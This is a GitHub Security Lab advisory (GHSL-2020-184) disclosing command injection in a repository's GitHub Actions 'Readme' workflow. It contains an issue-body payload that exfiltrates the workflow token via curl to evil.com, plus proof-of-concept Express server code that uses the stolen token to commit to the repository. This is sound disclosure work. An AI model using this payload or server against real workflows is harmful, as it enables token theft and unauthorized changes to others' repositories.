<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">February 3, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-184: Command injection in bdougie/awesome-black-developers workflow</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>10/14/2020: Report sent to vendor</li>
  <li>10/14/2020: Vendor acknowledges</li>
  <li>10/15/2020: Issue resolved</li>
</ul>

<h2 id="summary">Summary</h2>

<p>The <a href="https://github.com/bdougie/awesome-black-developers/blob/main/.github/workflows/readme.yml">‘Readme’ GitHub workflow</a> is vulnerable to arbitrary command injection.</p>

<h2 id="product">Product</h2>

<p><a href="https://github.com/bdougie/awesome-black-developers">Awesome-black-developers GitHub repository</a></p>

<h2 id="tested-version">Tested Version</h2>

<p><a href="https://github.com/bdougie/awesome-black-developers/blob/main/.github/workflows/readme.yml">readme.yml</a> from the main branch.</p>

<h2 id="details">Details</h2>

<h3 id="issue-the-body-of-a-public-github-issue-is-used-to-format-a-shell-command">Issue: The body of a public GitHub issue is used to format a shell command</h3>

<p>When a user creates a public issue it automatically starts the <a href="https://github.com/bdougie/awesome-black-developers/blob/main/.github/workflows/readme.yml">readme.yml</a> GitHub workflow. The body of the issue is used without sanitization to format a bash script.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>on:
  issues:
    types: <span class="o">[</span>opened, edited]
...
    - run:  <span class="s1">'echo "${{ github.event.issue.body }}" &gt; temp.txt'</span>
</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>This vulnerability allows for arbitrary command injection into the bash script. For example a user may create an issue with the body <code class="language-plaintext highlighter-rouge">a" &gt; temp.txt; set +e; curl -d @.git/config http://evil.com; sleep 10 #</code> which will exfiltrate the temporary GitHub repository authorization token to the attacker controlled server. Although the token is not valid after the workflow finishes, since the attacker controls the execution of the workflow he or she can delay it to give the malicious server time to modify the repository.<br />
Below is a Proof of Concept server code that receives the GitHub token and adds an arbitrary file to the repository.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">github</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">@actions/github</span><span class="dl">'</span><span class="p">)</span>

<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">()</span>
<span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">8000</span>

<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="k">try</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">octokit</span> <span class="o">=</span> <span class="nx">github</span><span class="p">.</span><span class="nx">getOctokit</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">t</span><span class="p">);</span>

    <span class="k">await</span> <span class="nx">octokit</span><span class="p">.</span><span class="nx">repos</span><span class="p">.</span><span class="nx">createOrUpdateFileContents</span><span class="p">({</span>
      <span class="c1">// this is a targeted attack, repo name can be hardcoded</span>
      <span class="na">owner</span><span class="p">:</span> <span class="dl">"</span><span class="s2">bdougie</span><span class="dl">"</span><span class="p">,</span>
      <span class="na">repo</span><span class="p">:</span> <span class="dl">"</span><span class="s2">bdougie/awesome-black-developers</span><span class="dl">"</span><span class="p">,</span>
      <span class="na">path</span><span class="p">:</span> <span class="dl">"</span><span class="s2">test.txt</span><span class="dl">"</span><span class="p">,</span>
      <span class="na">message</span><span class="p">:</span> <span class="dl">"</span><span class="s2">yet another commit</span><span class="dl">"</span><span class="p">,</span>
      <span class="na">content</span><span class="p">:</span> <span class="nx">Buffer</span><span class="p">.</span><span class="k">from</span><span class="p">(</span><span class="dl">"</span><span class="s2">another day in the office</span><span class="dl">"</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="dl">'</span><span class="s1">base64</span><span class="dl">'</span><span class="p">),</span>
      <span class="na">committer</span><span class="p">:</span> <span class="p">{</span><span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">bdougie</span><span class="dl">"</span><span class="p">,</span> <span class="na">email</span><span class="p">:</span> <span class="dl">"</span><span class="s2">bdougie@users.noreply.github.com</span><span class="dl">"</span><span class="p">},</span>
    <span class="p">})</span>

    <span class="nx">res</span><span class="p">.</span><span class="nx">sendStatus</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>

    <span class="nx">next</span><span class="p">();</span>
  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">next</span><span class="p">(</span><span class="nx">error</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`Listening at http://localhost:</span><span class="p">${</span><span class="nx">port</span><span class="p">}</span><span class="s2">`</span><span class="p">)</span>
<span class="p">})</span>
</code></pre></div></div>
<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-184</code> in any communication regarding this issue.</p>
